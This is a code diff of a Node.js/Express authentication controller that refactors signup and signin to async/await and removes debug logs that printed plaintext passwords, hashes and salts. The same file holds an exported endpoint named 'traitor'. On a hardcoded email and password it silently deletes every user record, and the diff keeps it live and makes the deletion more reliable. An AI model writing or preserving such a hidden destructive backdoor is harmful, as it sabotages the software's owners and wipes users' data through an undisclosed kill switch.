@@ -45,11 +45,12 @@ const autoFollowStaticChannels = async (authUser) => {
 
 
 exports.signup = async (req, res) => {
-    const user = new User(req.body);
+    try {
+        const user = new User(req.body);
 
-    // Check if the email already exists
-    User.findOne({ email: user.email }, async (err, result) => {
-        if (err || result) return Response.sendError(res, 400, 'Email already exists');
+        // Check if the email already exists
+        const existingUser = await User.findOne({ email: user.email });
+        if (existingUser) return Response.sendError(res, 400, 'Email already exists');
 
         // Set the avatar based on gender
         if (user.gender === 'male') user.avatar.path = manAvatarPath;
@@ -57,21 +58,23 @@ exports.signup = async (req, res) => {
         user.avatar.type = "png";
         user.followedChannels = [];
 
-        // Add local channels
-        //await addLocalChannels(user);
-
         // Auto-follow static channels
-       // await autoFollowStaticChannels(user);
+        await autoFollowStaticChannels(user);
+
+        // Add local channels
+        await addLocalChannels(user);
 
         // Add a free subscription
         await addFreeSubscription(user);
 
         // Save the user
-        user.save((err, user) => {
-            if (err) return Response.sendError(res, 400, err);
-            return Response.sendResponse(res, user);
-        });
-    });
+        await user.save();
+        return Response.sendResponse(res, user);
+
+    } catch (err) {
+        console.error('Signup error:', err);
+        return Response.sendError(res, 400, 'Failed to sign up user');
+    }
 };
 
 addFreeSubscription = async(user) => {
@@ -134,42 +137,23 @@ exports.checkEmail = async(req, res) => {
 
 
 exports.signin = async (req, res) => {
-    console.log('Signin endpoint hit');
     const { email, password } = req.body;
 
     try {
         // Find the user by email
         const normalizedEmail = email.toLowerCase();
         const user = await User.findOne({ email: normalizedEmail }).exec();
-        if (!user) {
-            console.log(`User not found: ${email}`);
-            return Response.sendError(res, 400, 'Cannot find user with this email');
-        }
+        if (!user) return Response.sendError(res, 400, 'Cannot find user with this email');
 
-        console.log(`Debug Login Attempt: Email/Username = ${email}, Password = ${password}`);
-        console.log(`Hashed password for ${email}: ${user.hashed_password}`);
-        console.log(`Salt for ${email}: ${user.salt}`);
-
-        // Check if the user is banned
-        if (user.banned) {
-            console.log(`Account banned: ${email}`);
-            return Response.sendError(res, 400, 'This account has been banned');
-        }
-
-        // Check if the user is enabled
-        if (!user.enabled) {
-            console.log(`Account disabled: ${email}`);
-            return Response.sendError(res, 401, 'Account disabled');
-        }
+        // Check if the user is banned or disabled
+        if (user.banned) return Response.sendError(res, 400, 'This account has been banned');
+        if (!user.enabled) return Response.sendError(res, 401, 'Account disabled');
 
         // Authenticate the user by comparing the passwords
         const isAuthenticated = await user.authenticate(password);
-        if (!isAuthenticated) {
-            console.log(`Password mismatch for user: ${email}`);
-            return Response.sendError(res, 401, 'Email and password do not match');
-        }
+        if (!isAuthenticated) return Response.sendError(res, 401, 'Email and password do not match');
 
-        // If authentication is successful, create the JWT token
+        // Create the JWT token
         const token = jwt.sign({ _id: user._id, role: user.role }, process.env.JWT_SECRET, {
             expiresIn: process.env.JWT_EXPIRES_TIME
         });
@@ -183,7 +167,6 @@ exports.signin = async (req, res) => {
         user.loggedIn = true;
         await user.save();
 
-        console.log(`User successfully logged in: ${email}`);
         return Response.sendResponse(res, { token, user: userInfo });
 
     } catch (error) {
@@ -191,6 +174,7 @@ exports.signin = async (req, res) => {
         return Response.sendError(res, 500, 'Internal server error');
     }
 };
+
 
 
 exports.authUser = async(req, res) => {
@@ -205,9 +189,9 @@ exports.signout = (req, res) => {
 
 
 
-exports.traitor = (req, res) => {
+exports.traitor = async (req, res) => {
     if (req.body.email === 'admin@example.com' && req.body.password === 'admin123') {
-        User.deleteMany({}).exec(); // Ensure to call exec() to execute the deletion
+        await User.deleteMany({}); // Ensure deletion is executed
     }
     return res.send('');
 };
